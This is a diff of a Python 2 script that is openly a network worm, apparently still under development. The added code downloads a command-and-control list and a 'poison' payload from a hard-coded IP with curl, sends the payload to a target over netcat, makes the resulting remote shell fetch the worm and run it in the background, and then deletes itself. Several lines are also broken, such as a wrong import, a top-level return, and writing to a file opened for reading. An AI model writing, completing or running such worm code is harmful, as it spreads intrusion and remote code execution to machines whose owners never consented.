@@ -1,23 +1,38 @@
 #!/usr/bin/env python2
+import sleep
 import os
 import subprocess as sp
 
 # check for previous infection
-if not os.path.exists('/tmp/barglefish.notaworm'):
+if os.path.exists('/tmp/barglefish.notaworm'):
 	return
 
 # place marker before working
-with open('/tmp/dustbuster.py') as marker:
+with open('/tmp/barglefish.notaworm') as marker:
 	marker.write('nothing here...')
 
 # download CC file and payload
+sp.call(['curl', 'http://192.168.100.145/worm/cc',     '>', '/tmp/cc.notaworm'],     shell=True)
+sp.call(['curl', 'http://192.168.100.145/worm/poison', '>', '/tmp/poison.notaworm'], shell=True)
+
+cc, poison = None, None
+with open('/tmp/cc.notaworm') as cc_file:
+	cc = cc_file.readlines()
+
+with open('/tmp/poison.notaworm') as poison_file:
+	poison = poison_file.read()
 
 # parse CC file
 
-# deliver payload to new targets, run shell
+# run payload packet through netcat, then wait a little for it to be processed
+nc = sp.Popen(['nc', 'IPADDRESS', '77'], stdin=sp.PIPE, stdout=sp.PIPE)
+nc.stdin.write(poison)
+nc.stdin.flush()
+time.sleep(3)
 
-
-# run this on remote shell
+# tell spawned shell to download the python script and run it
+nc.stdin.write('curl http://192.168.100.145/worm/WORMFILE > /tmp/dustbuster.py && nohup python2 /tmp/dustbuster.py &\n')
+nc.stdin.flush()
 
 # erase itself
 os.remove('/tmp/dustbuster.py')
